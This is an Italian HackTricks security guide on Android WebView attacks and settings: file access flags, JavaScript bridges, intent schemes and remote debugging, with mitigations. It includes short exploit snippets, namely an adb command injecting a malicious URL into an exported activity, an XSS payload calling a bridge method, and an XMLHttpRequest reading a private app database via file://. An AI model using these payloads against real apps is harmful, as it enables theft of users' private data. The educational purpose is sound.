# Attacchi a WebView

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Guida semplificata sulle configurazioni e la sicurezza di WebView

### Panoramica delle vulnerabilit√† di WebView

Un aspetto critico dello sviluppo Android riguarda la corretta gestione delle WebView. Questa guida evidenzia le configurazioni chiave e le pratiche di sicurezza per mitigare i rischi associati all'uso di WebView.

![Esempio di WebView](../../.gitbook/assets/image%20(718).png)

### **Accesso ai file nelle WebView**

Di default, le WebView consentono l'accesso ai file. Questa funzionalit√† √® controllata dal metodo `setAllowFileAccess()`, disponibile dalla versione API di Android 3 (Cupcake 1.5). Le applicazioni con il permesso **android.permission.READ_EXTERNAL_STORAGE** possono leggere file dalla memoria esterna utilizzando uno schema di URL file (`file://percorso/al/file`).

#### **Funzionalit√† deprecate: Accesso universale e accesso ai file dagli URL**

- **Accesso universale dagli URL dei file**: Questa funzionalit√† deprecata consentiva richieste cross-origin dagli URL dei file, rappresentando un significativo rischio per la sicurezza a causa di potenziali attacchi XSS. L'impostazione predefinita √® disabilitata (`false`) per le app che mirano ad Android Jelly Bean e versioni successive.
- Per verificare questa impostazione, utilizzare `getAllowUniversalAccessFromFileURLs()`.
- Per modificare questa impostazione, utilizzare `setAllowUniversalAccessFromFileURLs(boolean)`.

- **Accesso ai file dagli URL dei file**: Questa funzionalit√†, anch'essa deprecata, controllava l'accesso ai contenuti da altri URL con schema file. Come l'accesso universale, l'impostazione predefinita √® disabilitata per una maggiore sicurezza.
- Utilizzare `getAllowFileAccessFromFileURLs()` per verificare e `setAllowFileAccessFromFileURLs(boolean)` per impostare.

#### **Caricamento sicuro dei file**

Per disabilitare l'accesso al file system pur continuando ad accedere alle risorse e agli asset, viene utilizzato il metodo `setAllowFileAccess()`. Con Android R e versioni successive, l'impostazione predefinita √® `false`.
- Verificare con `getAllowFileAccess()`.
- Abilitare o disabilitare con `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

La classe **WebViewAssetLoader** √® l'approccio moderno per il caricamento di file locali. Utilizza URL http(s) per accedere alle risorse e agli asset locali, allineandosi alla politica Same-Origin, facilitando cos√¨ la gestione di CORS.

### **Gestione di JavaScript e Intent Scheme**

- **JavaScript**: Disabilitato di default nelle WebView, pu√≤ essere abilitato tramite `setJavaScriptEnabled()`. Si consiglia cautela in quanto l'abilitazione di JavaScript senza adeguate protezioni pu√≤ introdurre vulnerabilit√† di sicurezza.

- **Intent Scheme**: Le WebView possono gestire lo schema `intent`, potenzialmente portando a exploit se non gestito attentamente. Un esempio di vulnerabilit√† coinvolgeva un parametro WebView esposto "support_url" che poteva essere sfruttato per eseguire attacchi di cross-site scripting (XSS).

![WebView vulnerabile](../../.gitbook/assets/image%20(719).png)

Esempio di sfruttamento utilizzando adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView ‚Äìes support_url "https://example.com/xss.html"
```
### JavaScript Bridge

√à una funzionalit√† fornita da Android che consente a **JavaScript** in un WebView di invocare **funzioni native dell'app Android**. Ci√≤ viene realizzato utilizzando il metodo `addJavascriptInterface`, che integra JavaScript con le funzionalit√† native di Android, chiamato _WebView JavaScript bridge_. Si consiglia cautela poich√© questo metodo consente a tutte le pagine all'interno del WebView di accedere all'oggetto JavaScript Interface registrato, creando un rischio per la sicurezza se informazioni sensibili vengono esposte attraverso queste interfacce.

### Considerazioni importanti

- √à necessaria **estrema cautela** per le app che mirano a versioni di Android precedenti alla 4.2 a causa di una vulnerabilit√† che consente l'esecuzione di codice remoto tramite JavaScript dannoso, sfruttando la riflessione.

#### Implementazione di un JavaScript Bridge

- Le **interfacce JavaScript** possono interagire con il codice nativo, come mostrato negli esempi in cui un metodo di classe viene esposto a JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- Il JavaScript Bridge viene abilitato aggiungendo un'interfaccia al WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
- Possibile sfruttamento tramite JavaScript, ad esempio, attraverso un attacco XSS, consente di chiamare metodi Java esposti:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
- Per mitigare i rischi, **limitare l'uso del bridge JavaScript** al codice fornito con l'APK e impedire il caricamento di JavaScript da fonti remote. Per i dispositivi pi√π vecchi, impostare il livello API minimo a 17.

### Esecuzione remota di codice (RCE) basata su reflection

- Un metodo documentato consente di ottenere RCE attraverso la reflection eseguendo un payload specifico. Tuttavia, l'annotazione `@JavascriptInterface` impedisce l'accesso non autorizzato ai metodi, limitando la superficie di attacco.

### Debug remoto

- Il **debug remoto** √® possibile con **Chrome Developer Tools**, consentendo l'interazione e l'esecuzione arbitraria di JavaScript all'interno del contenuto WebView.

#### Abilitazione del debug remoto

- Il debug remoto pu√≤ essere abilitato per tutte le WebView all'interno di un'applicazione tramite:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Per abilitare condizionalmente il debug in base allo stato di debug dell'applicazione:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Estrarre file arbitrari

- Dimostra l'estrazione di file arbitrari utilizzando un XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Riferimenti
* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
